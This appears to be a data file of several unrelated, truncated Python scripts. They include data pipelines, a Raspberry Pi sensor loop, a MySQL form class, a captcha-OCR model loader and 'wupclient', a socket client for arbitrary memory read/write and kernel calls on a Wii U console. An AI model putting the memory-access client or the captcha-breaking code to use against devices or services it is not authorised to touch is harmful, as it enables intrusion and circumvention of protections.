    "import os\nimport numpy as np\nimport random\nimport shutil\n\ndef create_dataset(dataset_folder,data_folder,image_list):\n\n\tfor image in image_list:\n\n\t\timage_src_path=data_folder+image+'.jpg'\n\t\timage_dst_path=dataset_folder+os.sep+image+'.jpg'\n\n\t\tshutil.copy2(image_src_path,image_dst_path)\n\n\t\tbbox_src_path = data_folder + image + '.txt'\n\t\tbbox_dst_path = dataset_folder +os.sep+image+'.txt'\n\t\tshutil.copy2(bbox_src_path, bbox_dst_path)\n\n\t\tmask_src_path = data_folder + image + '.npz'\n\t\tmask_dst_path = dataset_folder + os.sep + image + '.npz'\n\t\tshutil.copy2(mask_src_path, mask_dst_path)\n\n\ndata_folder='D:/DLCode/wgisd/data/'\ntrain_masked_path ='D:/DLCode/wgisd/train_masked.txt'\n\nROOT_DIR = os.path.abspath(\".\")\nprint(ROOT_DIR)\n\n# load the names of the images\nwith open(train_masked_path, 'r') as fp:\n    data_list = fp.readlines()\n\ndata_list = set([i[:-1] for i in data_list])\n\n# split\ndata_list=sorted(data_list)\nrandom.shuffle(data_list)\n\ni = int(len(data_list) * 0.8)\ndata_list_train = data_list[:i]\ndata_list_val = data_list[i:]\n\n#create dataset folder\ndataset_folder= os.path.sep.join([ROOT_DIR,\"dataset\"])\nif not os.path.exists(dataset_folder):\n\tos.makedirs(dataset_folder)\n\n#build train dataset\ndataset_folder_train= os.path.sep.join([dataset_folder,\"train\"])\nif not os.path.exists(dataset_folder_train):\n\tos.makedirs(dataset_folder_train)\ncreate_dataset(dataset_folder_train,data_folder,data_list_train)\n\n# build Validation dataset\ndataset_folder_val= os.path.sep.join([dataset_folder,\"val\"])\nif not os.path.exists(dataset_folder_val):\n\tos.makedirs(dataset_folder_val)\ncreate_dataset(dataset_folder_val,data_folder,data_list_val)\n\n#for i in data_list:\n#   print(i)\n\nprint(\"\\ntrain:{},val:{}\".format(len(data_list_train),len(data_list_val)))\n\n",
    "\"\"\"\nEste script llama a los m\u00f3dulos (y sus funcionalidades) de extracci\u00f3n\n\"full\" e \"incremental\" de datos de la API, al de almacenamiento de los\nmismos en un Data Lake y Data Werehouse, y al de procesamiento,\ntransformaici\u00f3n y agregaci\u00f3n.\n\"\"\"\n\n# Se importan los modulos necesarios\nfrom pprint import pprint\nfrom extraction import station_data, data_full, data_incremental\nfrom storage import almacena_full, almacena_part, particion, werehouse_save, werehouse_read\nfrom prosecution import duplicados, elimnar_reportes_nulos, imputacion_datos_nulos, separador_campo_time, formato_datos, formato_metadatos, modificar_campos, imputacion_metadatos_nulos, concatenacion, maxima, minima\n\n# Se le da acceso al editor\nif __name__ == \"__main__\":\n    # Se ingresan el URL de la API y los endpoints de interes\n    base_url = \"https://aviationweather.gov\"\n    endpoint_aero = \"api/data/stationinfo\"\n    endpoint_metar = \"api/data/metar\"\n    aeropuerto = \"SAEZ\"\n\n    # EXTRACCION\n    # Dataframe de extraccion full de la metadata de la estacion\n    df_station_metadata_landing = station_data(base_url, endpoint_aero, aeropuerto)\n    # Dataframe de extracci\u00f3n full de datos de la estacion\n    df_station_data_full_landing = data_full(base_url, endpoint_metar, aeropuerto)\n    # Dataframe de extraccion incremental de datos de la estacion\n    df_station_data_incremental_landing = data_incremental(base_url, endpoint_metar, aeropuerto)\n    \n    # ALMACENAMIENTO (Capa Landing/Bronce)\n    # Se almacena la metadata de la estacion meteorologica\n    almacena_full(df_station_metadata_landing, layer='landing', endpoint='stations', aeropuerto=aeropuerto)\n    # Se almacena los mensajes metar de horas previas\n    almacena_full(df_station_data_full_landing, layer='landing', endpoint='mesure/full', aeropuerto=aeropuerto)\n    # Se almacena los mensajes metar de la ultima hora\n    part = particion(df_station_data_incremental_landing)\n    almacena_part(df_station_data_incremental_landing, layer='landing', endpoint='mesure/incre', aeropuerto=aeropuerto, part=part)\n    \n    # PROCESAMIENTO\n    # Se usan los DataFrame \"Landing\" punto de partida para los \"trusted\"\n    df_station_metadata_trusted = df_station_metadata_landing\n    df_station_data_full_trusted = df_station_data_full_landing\n    df_station_data_incremental_trusted = df_station_data_incremental_landing\n    # Procesamiento Metadatos:\n    # Tratamiento de faltantes en los metadatos\n    df_station_metadata_trusted = imputacion_metadatos_nulos(df_station_metadata_trusted)\n    # Reasignacion de tipo de dato y campos\n    df_station_metadata_trusted = formato_metadatos(df_station_metadata_trusted)\n    df_station_metadata_trusted = modificar_campos(df_station_metadata_trusted, campos_nuevos=['ICAO','Latitud','Longitud','MSNM','Pa\u00eds'])\n    # Procesamiento Datos:\n    # Eliminacion de registros duplicados\n    df_station_data_full_trusted = duplicados(df_station_data_full_trusted)\n    # Eliminacion de registros con fecha/hora nulos\n    df_station_data_full_trusted = elimnar_reportes_nulos(df_station_data_full_trusted, campo='reportTime')\n    df_station_data_incremental_trusted = elimnar_reportes_nulos(df_station_data_incremental_trusted, campo='reportTime')\n    # Asignacion de valor \"NaN\" a los registros con valores faltantes de temperatura\n    df_station_data_full_trusted = imputacion_datos_nulos(df_station_data_full_trusted, campo='temp')\n    df_station_data_incremental_trusted = imputacion_datos_nulos(df_station_data_incremental_trusted, campo='temp')\n    # Separacion de datos de fecha y hora\n    df_station_data_full_trusted = separador_campo_time(df_station_data_full_trusted, campo='reportTime')\n    df_station_data_incremental_trusted = separador_campo_time(df_station_data_incremental_trusted, campo='reportTime')\n    # Reasignacion de los tipos de datos\n    df_station_data_full_trusted = formato_datos(df_station_data_full_trusted)\n    df_station_data_incremental_trusted = formato_datos(df_station_data_incremental_trusted)\n    # Reasignacion nombre campos\n    df_station_data_full_trusted = modificar_campos(df_station_data_full_trusted, campos_nuevos=['Temperatura','A\u00f1o','Mes','D\u00eda','Hora','Minuto'])\n    df_station_data_incremental_trusted = modificar_campos(df_station_data_incremental_trusted, campos_nuevos=['Temperatura','A\u00f1o','Mes','D\u00eda','Hora','Minuto'])\n\n    # ALMACENAMIENTO (Capa Trusted/Plata)\n    # Se almacena la metadata de la estacion meteorologica\n    almacena_full(df_station_metadata_trusted, layer='trusted', endpoint='stations', aeropuerto=aeropuerto)\n    # Se almacena los mensajes metar de horas previas\n    almacena_full(df_station_data_full_trusted, layer='trusted', endpoint='mesure/full', aeropuerto=aeropuerto)\n    # Se almacena los mensajes metar de la ultima hora\n    almacena_part(df_station_data_incremental_trusted, layer='trusted', endpoint='mesure/incre', aeropuerto=aeropuerto, part=part)\n\n    # PROCESAMIENTO\n    # Se usan los DataFrame \"trusted\" punto de partida para los \"refined\" (se unen l",
    "# Importing necessary libraries\nimport RPi.GPIO as Gpio  # Using \"Gpio\" as an alias for RPi.GPIO\nimport time\n\n# Set GPIO mode to BOARD (physical pin numbering)\nGpio.setmode(Gpio.BOARD)\nGpio.setwarnings(False)  # Disable GPIO warnings\nGpio.setup(8, Gpio.OUT)  # Set pin 8 as output\n\n# Define GPIO pins for ultrasonic sensor\nGpio_TRIGGER = 10  # Trigger pin\nGpio_ECHO = 12     # Echo pin\n\n# Set GPIO pin directions (Trigger as OUTPUT, Echo as INPUT)\nGpio.setup(Gpio_TRIGGER, Gpio.OUT)\nGpio.setup(Gpio_ECHO, Gpio.IN)\n\n# Function to measure distance using ultrasonic sensor\ndef distance():\n    Gpio.output(Gpio_TRIGGER, True)  # Set Trigger pin to HIGH\n    time.sleep(0.00001)              # Wait for a short duration\n    Gpio.output(Gpio_TRIGGER, False) # Set Trigger pin back to LOW\n\n    StartTime = time.time()  # Record the start time\n    StopTime = time.time()   # Record the stop time\n\n    # Wait for the Echo pin to go HIGH (start of pulse)\n    while Gpio.input(Gpio_ECHO) == 0:\n        StartTime = time.time()\n\n    # Wait for the Echo pin to go LOW again (end of pulse)\n    while Gpio.input(Gpio_ECHO) == 1:\n        StopTime = time.time()\n\n    # Calculate the time difference between start and stop\n    TimeElapsed = StopTime - StartTime\n\n    # Calculate distance based on the speed of sound\n    # (divided by 2 because sound travels to the object and back)\n    distance = (TimeElapsed * 34300) / 2\n\n    return distance\n\n# Main program\nif __name__ == '__main__':\n    try:\n        while True:\n            dist = distance()  # Get distance from the ultrasonic sensor\n            print(\"Measured Distance = %.1f cm\" % dist)  # Print the distance\n            time.sleep(1)  # Wait for 1 second\n\n            # Example: Control an output based on distance\n            # Uncomment and modify as needed\n            \n            #if dist < 10:\n            #    Gpio.output(8, Gpio.HIGH)  # Turn ON an output\n            #    time.sleep(3)  # Wait for 3 seconds\n            #    Gpio.output(8, Gpio.LOW)  # Turn OFF the output\n            #    time.sleep(1)  # Wait for 1 second\n            \n            \n    except KeyboardInterrupt:  # Handle CTRL+C interrupt\n        print(\"Measurement stopped by User\")\n        Gpio.cleanup()  # Clean up GPIO resources\n",
    "# importing mysql connector and database password user from server details.py file\nimport mysql.connector\nfrom login import Login\n\n\n\n\n# making a class user and inherits with login\nclass User(Login):\n    def __init__(self):\n        self.user_table=\"\"    # assign it as empty in initial\n        super().__init__()\n\n    \n    # mehtod to craete table for user with hiws username\n    def table_for_user(self):\n        try:\n            self.create_connection()\n            self.cursor.execute(f\"USE {self.database}\")\n            table_query=f\"\"\"CREATE TABLE IF NOT EXISTS {self.user_table}(\n            id INT PRIMARY KEY,\n            names VARCHAR (30),\n            emails VARCHAR (50),\n            numbers VARCHAR (50)\n            )\"\"\"\n            self.cursor.execute(table_query)\n        except mysql.connector.Error as e:\n            print(f\"Error:{e}\")\n\n\n    # making a mehtod to retrieve data froimn user table\n    def retrieve_data(self):\n        try:\n            self.create_connection()\n            self.cursor.execute(f\"USE {self.database}\")\n            self.cursor.execute(f\"SELECT * FROM {self.user_table}\")\n            data=self.cursor.fetchall()\n            return data\n        except mysql.connector.Error as e:\n            print(f\"Error: {e}\")\n\n \n    # mehtod to take id (primary key) input\n    def id_input(self):\n        data=self.retrieve_data() # calling mehtod to get data list from table\n        # taking id input\n        while True:\n            try:\n                id_input=int(input(\"Enter Id to assign to employee (enter 0 to back):\"))\n                if id_input==0:   # if want to go back\n                    print(\"Return To previous Options..\\n\")\n                    return\n                \n                if id_input<=0:\n                    print(\"Id Must not be zero or less than zero\\n\")\n\n                # check id must not be repeated beacuse of primary key\n                if data:\n                    found = False\n                    for row in data:\n                        if id_input==row[0]:  # If id matches\n                            found=True\n                            break\n                    if found:\n                        print(\"Please Select another Id This id already exists.\\n\")\n                    # if id not matches\n                    else:\n                        print(\"Id assign successfully\\n\")\n                        return id_input\n                # for initial when no data enter\n                else:\n                    print(\"Id assign successfully\\n\")\n                    return id_input\n\n            # if getting id rather than in number\n            except ValueError:\n                print(\"Please Enter In Digit Id must be in digit\")\n    \n    # mehtod to take name input\n    def get_valid_name(self):\n        while True:\n            name = input(\"Please enter your name (enter 0 to go back):\").strip()\n            \n            if name == '0':\n                return   # User wants to go back\n            elif len(name) < 3:\n                print(\"\\nName must be at least 3 characters long.\\n\")\n            elif not all(char.isalpha() or char.isspace() for char in name):\n                print(\"\\nName must contain only alphabets and space.\\n\")\n            else:\n                return name\n    \n\n    # mehtod to take gmail input\n    def get_valid_gmail(self):\n        while True:\n            gmail = input(\"Enter Person's gmail (enter 0 to go back): \").strip()\n            special_characters = '!#$%^&*()_+|}{\":<?/,\\';\\\\][=-]}'\n            \n\n            if gmail==\"0\":\n                print(\"Going back To previous menu\")\n                return\n            if gmail == '':\n                print('\\nRequired field cannot be left blank\\n')\n            elif gmail.startswith(' '):\n                print('The entered gmail is not valid\\n')\n            elif not (6 < len(gmail) < 30):\n                print('\\nLength must be between 6 and 30 characters long\\n')\n            elif not gmail.endswith('@gmail.com'):\n                print('\\nMake sure @gmail.com must be at last\\n')\n            elif gmail.startswith('@gmail.com'):\n                print('\\nEnter valid Gmail\\n')\n            elif gmail.endswith('.@gmail.com'):\n                print('\\nSorry, the last character before @gmail.com must be a letter or number\\n')\n            elif any(char in special_characters for char in gmail):\n                print('\\nOnly letters and numbers are allowed\\n')\n            else:\n                break\n\n        return gmail\n    \n\n    def get_valid_phone_number(self):\n        while True:\n            phone_number = input(\"Enter your phone number (enetr 0 to back):\").strip()\n            if phone_number == '0':\n                return   # User wants to go back\n            elif not phone_number.isdigit():\n                print(\"Phone number must contain only digits.\\n\")\n            elif len(phone_number) != 11:\n                print(\"Phone number must be 11 digits long.\\n\")\n            else:\n                return phone_number\n\n\n    ",
    "import datetime\nimport requests\nfrom bs4 import BeautifulSoup\nfrom reportlab.lib.pagesizes import letter\nfrom reportlab.platypus import SimpleDocTemplate, Table, TableStyle\nfrom reportlab.lib import colors\nimport tkinter as tk\nfrom tkinter import filedialog\nfrom tkinter import messagebox\n\n\ndef generate_pdf():\n    # URL of the website\n    url = \"https://daffodilvarsity.edu.bd/department/swe/notice\"\n\n    # Send a GET request to the URL\n    try:\n        response = requests.get(url)\n        response.raise_for_status()\n    except requests.exceptions.RequestException as e:\n        messagebox.showerror(\"Error\", f\"Failed to fetch data: {e}\")\n        return\n\n    # Parse the HTML content\n    soup = BeautifulSoup(response.text, 'html.parser')\n\n    # Find all notice links within the page\n    notice_links = soup.find_all('h3', class_='heading')\n\n    # Extract notice titles and links\n    titles = [link.a.text.strip() for link in notice_links]\n    links = [link.a['href'] for link in notice_links]\n\n    # Get today's date\n    today = datetime.datetime.now().strftime(\"%Y-%m-%d\")\n\n    # Define the table data\n    data = [['Title', 'Link']]  # Headers\n\n    # Add notice titles and links to the table data\n    for title, link in zip(titles, links):\n        data.append([title, link])\n\n    # Create PDF\n    pdf_file = filedialog.asksaveasfilename(defaultextension=\".pdf\", filetypes=[(\"PDF files\", \"*.pdf\")])\n    if pdf_file:\n        doc = SimpleDocTemplate(pdf_file, pagesize=letter)\n\n        # Create table\n        table = Table(data)\n\n        # Add style to table\n        style = TableStyle([('BACKGROUND', (0, 0), (-1, 0), colors.lightblue),\n                            ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),\n                            ('ALIGN', (0, 0), (-1, -1), 'CENTER'),\n                            ('BOTTOMPADDING', (0, 0), (-1, 0), 12),\n                            ('BACKGROUND', (0, 1), (-1, -1), colors.beige),\n                            ('GRID', (0, 0), (-1, -1), 1, colors.black)])\n\n        table.setStyle(style)\n\n        # Add table to the PDF\n        doc.build([table])\n\n        messagebox.showinfo(\"Success\", f\"PDF file saved successfully at:\\n{pdf_file}\")\n        app.destroy()  # Close the application window\n\n\n# Create Tkinter app\napp = tk.Tk()\napp.title(\"PDF Generator\")\n\n# Create generate button\ngenerate_button = tk.Button(app, text=\"Generate PDF\", command=generate_pdf)\ngenerate_button.pack(pady=10)\n\n# Run the app\napp.mainloop()\n",
    "# may or may not be inspired by plutoo's ctrrpc\nimport errno\nimport socket\nimport os\nimport sys\nimport struct\nimport codecs\nfrom time import sleep\n\ndef buffer(size):\n    return bytearray([0x00] * size)\n\ndef copy_string(buffer, s, offset):\n    s += \"\\0\"\n    buffer[offset : (offset + len(s))] = bytearray(s, \"ascii\")\n\ndef copy_word(buffer, w, offset):\n    buffer[offset : (offset + 4)] = struct.pack(\">I\", w)\n\ndef get_string(buffer, offset):\n    s = buffer[offset:]\n    if b'\\x00' in s:\n        return s[:s.index(b'\\x00')].decode(\"utf-8\")\n    else:\n        return s.decode(\"utf-8\")\n\nclass wupclient:\n    s=None\n\n    def __init__(self, ip='192.168.0.0', port=1337):\n        self.s=socket.socket()\n        self.s.connect((ip, port))\n        self.fsa_handle = None\n        self.cwd = \"/vol/storage_mlc01\"\n\n    def __del__(self):\n        if self.fsa_handle != None:\n            self.close(self.fsa_handle)\n            self.fsa_handle = None\n\n    # fundamental comms\n    def send(self, command, data):\n        request = struct.pack('>I', command) + data\n\n        self.s.send(request)\n        response = self.s.recv(0x600)\n\n        ret = struct.unpack(\">I\", response[:4])[0]\n        return (ret, response[4:])\n\n    # core commands\n    def read(self, addr, len):\n        data = struct.pack(\">II\", addr, len)\n        ret, data = self.send(1, data)\n        if ret == 0:\n            return data\n        else:\n            print(\"read error : %08X\" % ret)\n            return None\n\n    def send_and_exit(self, command, data):\n        request = struct.pack('>I', command) + data\n        self.s.send(request)\n        self.s.close()\n        self.s = None\n        self.fsa_handle = None\n        exit()\n\n    def write(self, addr, data):\n        data = struct.pack(\">I\", addr) + data\n        ret, data = self.send(0, data)\n        if ret == 0:\n            return ret\n        else:\n            print(\"write error : %08X\" % ret)\n            return None\n\n    def svc(self, svc_id, arguments):\n        data = struct.pack(\">I\", svc_id)\n        for a in arguments:\n            data += struct.pack(\">I\", a)\n        ret, data = self.send(2, data)\n        if ret == 0:\n            return struct.unpack(\">I\", data)[0]\n        else:\n            print(\"svc error : %08X\" % ret)\n            return None\n\n    def svc_and_exit(self, svc_id, arguments):\n        data = struct.pack(\">I\", svc_id)\n        for a in arguments:\n            data += struct.pack(\">I\", a)\n        self.send_and_exit(2, data)\n\n    def kill(self):\n        ret, _ = self.send(3, bytearray())\n        return ret\n\n    def memcpy(self, dst, src, len):\n        data = struct.pack(\">III\", dst, src, len)\n        ret, data = self.send(4, data)\n        if ret == 0:\n            return ret\n        else:\n            print(\"memcpy error : %08X\" % ret)\n            return None\n\n    def repeatwrite(self, dst, val, n):\n        data = struct.pack(\">III\", dst, val, n)\n        ret, data = self.send(5, data)\n        if ret == 0:\n            return ret\n        else:\n            print(\"repeatwrite error : %08X\" % ret)\n            return None\n\n    # derivatives\n    def alloc(self, size, align = None):\n        if size == 0:\n            return 0\n        if align == None:\n            return self.svc(0x27, [0xCAFF, size])\n        else:\n            return self.svc(0x28, [0xCAFF, size, align])\n\n    def free(self, address):\n        if address == 0:\n            return 0\n        return self.svc(0x29, [0xCAFF, address])\n\n    def load_buffer(self, b, align = None):\n        if len(b) == 0:\n            return 0\n        address = self.alloc(len(b), align)\n        self.write(address, b)\n        return address\n\n    def load_string(self, s, align = None):\n        return self.load_buffer(bytearray(s + \"\\0\", \"ascii\"), align)\n\n    def open(self, device, mode):\n        address = self.load_string(device)\n        handle = self.svc(0x33, [address, mode])\n        self.free(address)\n        return handle\n\n    def close(self, handle):\n        return self.svc(0x34, [handle])\n\n    def ioctl(self, handle, cmd, inbuf, outbuf_size):\n        in_address = self.load_buffer(inbuf)\n        out_data = None\n        if outbuf_size > 0:\n            out_address = self.alloc(outbuf_size)\n            ret = self.svc(0x38, [handle, cmd, in_address, len(inbuf), out_address, outbuf_size])\n            out_data = self.read(out_address, outbuf_size)\n            self.free(out_address)\n        else:\n            ret = self.svc(0x38, [handle, cmd, in_address, len(inbuf), 0, 0])\n        self.free(in_address)\n        return (ret, out_data)\n\n    def iovec(self, vecs):\n        data = bytearray()\n        for (a, s) in vecs:\n            data += struct.pack(\">III\", a, s, 0)\n        return self.load_buffer(data)\n\n    def ioctlv(self, handle, cmd, inbufs, outbuf_sizes, inbufs_ptr = [], outbufs_ptr = []):\n        inbufs = [(self.load_buffer(b, 0x40), len(b)) for b in inbufs]\n        outbufs = [(self.alloc(s, 0x40), s) for s in outbuf_sizes]\n        iovecs = self.iovec(inbufs + inbufs_ptr + outbufs_ptr + ",
    "import customtkinter as ctk\nfrom tkinter import messagebox\nw=ctk.CTk()\nglobal ssa1,pt1,ssa2,sa1,fa1,ssa3var,pt2,ssa4var,sa2,fa2,namevar,rollvar\nssa1var=ctk.StringVar()\npt1=ctk.StringVar()\nssa2var=ctk.StringVar()\nsa1=ctk.StringVar()\nfa1=ctk.StringVar()\nssa3var=ctk.StringVar()\npt2=ctk.StringVar()\nssa4var=ctk.StringVar()\nsa2=ctk.StringVar()\nfa2=ctk.StringVar()\nnamevar=ctk.StringVar()\nrollvar=ctk.StringVar()\ndef window():\n    w.title('Internal calculator')\n    w.geometry('1300x800+0+0')\n    w.resizable(False,False)\n    w._set_appearance_mode('Dark')\ndef calculate():\n    n1=ssa1var.get()\n    n2=ssa2var.get()\n    n3=pt1.get()\n    n4=sa1.get()\n    n5=fa1.get()\n    n6=ssa3var.get()\n    n7=ssa4var.get()\n    n8=pt2.get()\n    n9=sa2.get()\n    n10=fa2.get()\n    n11=namevar.get()\n    n12=rollvar.get()\n    if(n1==\"\" or n2==\"\" or n3==\"\" or n4==\"\" or n5==\"\" or n6==\"\" or n7==\"\" or n8==\"\" or n9==\"\" or n10==\"\" or n11==\"\" or n12==\"\"):\n        messagebox.showerror('invalid','enter all details')\n    elif(float(n1)<0 or float(n2)<0 or float(n3)<0 or float(n4)<0 or float(n5)<0 or float(n6)<0 or float(n7)<0 or float(n8)<0 or float(n9)<0 or float(n10)<0 ):\n        messagebox.showerror('invalid','enter +ve numbers')\n    elif(float(n1)>20 or float(n2)>20 or float(n3)>50 or float(n4)>100 or float(n5)>40 or float(n6)>20 or float(n7)>20 or float(n8)>50 or float(n9)>100 or float(n10)>40):\n        messagebox.showerror('error','Enter the number in range')\n    else:\n        newssa1=(float(n1)/20)*1\n        newpt1=(float(n3)/50)*2\n        newssa2=(float(n2)/20)*1\n        newsa1=(float(n4)/100)*8\n        newfa1=(float(n5)/40)*8\n        rel=newssa1+newpt1+newssa2+newsa1+newfa1\n        newrel='{:.3f}'.format(rel)\n        #result_out.configure(text=str(newrel))\n        newssa3=(float(n6)/20)*1\n        newpt2=(float(n8)/50)*2\n        newssa4=(float(n7)/20)*1\n        newsa2=(float(n9)/100)*8\n        newfa2=(float(n10)/40)*8\n        rel2=newssa3+newpt2+newssa4+newsa2+newfa2\n        newrel2='{:.3f}'.format(rel2)\n        TOT=rel+rel2\n        newTOT='{:.2f}'.format(TOT)\n        l1=str(newrel)\n        l2=str(newrel2)\n        result_out.configure(text=l1)\n        result2_out.configure(text=l2)\n        total_out.configure(text=str(newTOT))\n        #result2_out.configure(text=str(newrel))\ndef design1():\n    #heading\n    global ssa1_entry,PT_entry,ssa2_entry,cia1_entry,fa1_entry,result_out,name_entry,roll_entry\n    head=ctk.CTkLabel(w,text='Internal calculator',text_color='blue',font=('impact',40))\n    head.place(x=490,y=30)\n    #name lable\n    name=ctk.CTkLabel(w,text='Name :',text_color='white',font=('microsoft yahi ui light',20,'bold'))\n    name.place(x=100,y=140)\n    #name entry\n    name_entry=ctk.CTkEntry(w,border_width=1,width=200,height=30,font=('microsoft yahi ui light',16,'bold'),textvariable=namevar)\n    name_entry.place(x=200,y=140)\n     # rollnumber\n    roll=ctk.CTkLabel(w,text='Roll :',text_color='white',font=('microsoft yahi ui light',20,'bold'))\n    roll.place(x=490,y=140)\n    # rollnumber entry\n    roll_entry=ctk.CTkEntry(w,border_width=1,width=190,height=30,font=('microsoft yahi ui light',16,'bold'),textvariable=rollvar)\n    roll_entry.place(x=590,y=140)\n    #lable1\n    ssa1=ctk.CTkLabel(w,text='SSA 1:',text_color='orange',font=('microsoft yahi ui light',20,'bold'))\n    ssa1.place(x=100,y=230)\n    #entry\n    ssa1_entry=ctk.CTkEntry(w,border_width=1,width=140,height=30,font=('microsoft yahi ui light',16,'bold'),textvariable=ssa1var)\n    ssa1_entry.place(x=200,y=229)\n    #lable1\n    ssa1_out=ctk.CTkLabel(w,text='/ 20',text_color='orange',font=('microsoft yahi ui light',20,'bold'))\n    ssa1_out.place(x=370,y=230)\n    #lable2\n    PT=ctk.CTkLabel(w,text='PT 1:',text_color='orange',font=('microsoft yahi ui light',20,'bold'))\n    PT.place(x=100,y=310)\n    #entry 2\n    PT_entry=ctk.CTkEntry(w,border_width=1,width=140,height=30,font=('microsoft yahi ui light',16,'bold'),textvariable=pt1)\n    PT_entry.place(x=200,y=310)\n    #lable2 \n    PT_out=ctk.CTkLabel(w,text='/ 50',text_color='orange',font=('microsoft yahi ui light',20,'bold'))\n    PT_out.place(x=370,y=310)\n    #lable3\n    ssa2=ctk.CTkLabel(w,text='SSA 2:',text_color='orange',font=('microsoft yahi ui light',20,'bold'))\n    ssa2.place(x=100,y=390)\n    #entry 3\n    ssa2_entry=ctk.CTkEntry(w,border_width=1,width=140,height=30,font=('microsoft yahi ui light',16,'bold'),textvariable=ssa2var)\n    ssa2_entry.place(x=200,y=390)\n    #lable 3\n    ssa2_out=ctk.CTkLabel(w,text='/ 20',text_color='orange',font=('microsoft yahi ui light',20,'bold'))\n    ssa2_out.place(x=370,y=390)\n    #lable 4\n    cia1=ctk.CTkLabel(w,text='SA 1:',text_color='orange',font=('microsoft yahi ui light',20,'bold'))\n    cia1.place(x=100,y=470)\n    #entry 4\n    cia1_entry=ctk.CTkEntry(w,border_width=1,width=140,height=30,font=('microsoft yahi ui light',16,'bold'),textvariable=sa1)\n    cia1_entry.place(x=200,y=470)\n    #lable 4\n    cia1_out=ctk.CTkLabel(w,text='/ 100',text_color='orange',font=('microsoft yahi ui light',20,'bold'))\n    ",
    "import torch\nimport os.path\nimport platform\nimport torch.nn as nn\nfrom PIL import Image\nfrom loguru import logger\nfrom torchvision import transforms\nimport torchvision.models as models\nfrom iyuecaptcha.tools import Tools\nfrom torch.utils.data import Dataset, DataLoader\nfrom iyuecaptcha.tools import get_defualt_device\nfrom torch.utils.tensorboard import SummaryWriter\n\ntool = Tools()\n\n\nclass CaptchaOCRDataset(Dataset):\n    def __init__(self, root_dir, split):\n        '''\n        \u9a8c\u8bc1\u7801\u56fe\u7247\u6570\u636e\u52a0\u8f7d\n\n        :param root_dir: \u9700\u8981\u52a0\u8f7d\u7684\u56fe\u7247\u76ee\u5f55\u8def\u5f84\n        :param split: \u8def\u5f84\u6807\u7b7e\u5206\u5272 \u4ece\u6587\u4ef60A7NC-1713030561.png \u83b7\u53d6\u6807\u7b7e 0A7NC\n        '''\n        super(CaptchaOCRDataset, self).__init__()\n        self.__split = split\n        # \u52a0\u8f7d\u6240\u6709\u56fe\u7247\u8def\u5f84\n        self.__list_image_path = []\n        skip_count = 0\n        for path in os.listdir(root_dir):\n            if self.__split not in path or '.DS_Store' in path:\n                logger.debug(f'{path}: Not meeting the requirements,skip')\n                skip_count = skip_count + 1\n                continue\n            self.__list_image_path.append(os.path.join(root_dir, path))\n        # self.__list_image_path = [os.path.join(root_dir, path) for path in os.listdir(root_dir)]\n        self.__transform = transforms.Compose([\n            transforms.Resize((tool.height, tool.width)),\n            transforms.ToTensor(),\n            transforms.Grayscale()\n        ])\n        logger.info(f'{len(self.__list_image_path)} images loaded, {skip_count} images skip')\n\n    def __getitem__(self, item):\n        \"\"\"\n        \u6839\u636e\u7d22\u5f15\u83b7\u53d6\u56fe\u50cf\u53ca\u5176\u5bf9\u5e94\u7684\u9a8c\u8bc1\u7801\u3002\n\n        \u53c2\u6570:\n        - self: \u5bf9\u8c61\u81ea\u8eab\u3002\n        - item: \u7d22\u5f15\u503c\uff0c\u7528\u4e8e\u4ece\u56fe\u50cf\u8def\u5f84\u5217\u8868\u4e2d\u83b7\u53d6\u7279\u5b9a\u7684\u56fe\u50cf\u8def\u5f84\u3002\n\n        \u8fd4\u56de\u503c:\n        - image_transform: \u7ecf\u8fc7\u53d8\u6362\u5904\u7406\u7684\u56fe\u50cf\u3002\n        - captcha: \u56fe\u50cf\u5bf9\u5e94\u7684\u9a8c\u8bc1\u7801\u6587\u672c\u3002\n        \"\"\"\n        # \u6839\u636e\u7d22\u5f15\u83b7\u53d6\u56fe\u50cf\u8def\u5f84\n        image_path = self.__list_image_path[item]\n        # \u6253\u5f00\u56fe\u50cf\n        image = Image.open(image_path)\n        # \u5bf9\u56fe\u50cf\u8fdb\u884c\u9884\u5b9a\u4e49\u7684\u53d8\u6362\u5904\u7406\n        image_transform = self.__transform(image)\n        # \u6839\u636e\u64cd\u4f5c\u7cfb\u7edf\u4e0d\u540c\u9009\u62e9\u8def\u5f84\u5206\u9694\u7b26\n        split = '/'\n        if platform.system() == 'Windows':\n            split = '\\\\'\n        # \u4ece\u56fe\u50cf\u8def\u5f84\u4e2d\u63d0\u53d6\u6587\u4ef6\u540d\uff0c\u5e76\u8fdb\u4e00\u6b65\u63d0\u53d6\u9a8c\u8bc1\u7801\u6587\u672c\n        image_name = self.__list_image_path[item].split(split)[-1]\n        captcha = image_name.split(self.__split)[0]\n        # \u5c06\u9a8c\u8bc1\u7801\u6587\u672c\u8f6c\u6362\u4e3a\u5411\u91cf\u8868\u793a\n        '''\n        .view(1, -1): \n            \u8fd9\u662fPyTorch\u4e2d\u7684view()\u51fd\u6570\u8c03\u7528\uff0c\u4f5c\u7528\u662f\u5bf9\u4e0a\u4e00\u6b65\u5f97\u5230\u7684\u5411\u91cf\u6216\u77e9\u9635\u8fdb\u884c\u7ef4\u5ea6\u8c03\u6574\u3002\u8fd9\u91cc\u7684\u53c2\u6570(1, -1)\u6307\u793a\u4e86\u65b0\u7684\u5f62\u72b6\uff1a\n        1: \u8868\u793a\u5e0c\u671b\u4fdd\u6301\u4e00\u4e2a\u7ef4\u5ea6\u7684\u5927\u5c0f\u4e3a1\u3002\u5728\u5f88\u591a\u6df1\u5ea6\u5b66\u4e60\u5e94\u7528\u4e2d\uff0c\u5c24\u5176\u662f\u4e0e\u5e8f\u5217\u6570\u636e\u76f8\u5173\u7684\u6a21\u578b\uff0c\u53ef\u80fd\u4f1a\u8981\u6c42\u8f93\u5165\u6570\u636e\u5177\u6709 batch dimension\uff08\u6279\u91cf\u7ef4\u5ea6\uff09\u3002\n            \u8fd9\u91cc\u8bbe\u7f6e\u4e3a1\u610f\u5473\u7740\u5373\u4f7f\u539f\u59cb\u9a8c\u8bc1\u7801\u5411\u91cf\u53ea\u6709\u4e00\u4e2a\u6837\u672c\uff0c\u4e5f\u8981\u5c06\u5176\u5305\u88c5\u5728\u4e00\u4e2a\u201c\u6279\u91cf\u201d\u4e2d\uff0c\u4f7f\u5f97\u6a21\u578b\u53ef\u4ee5\u63a5\u53d7\u8fd9\u6837\u7684\u8f93\u5165\u3002\n        -1: 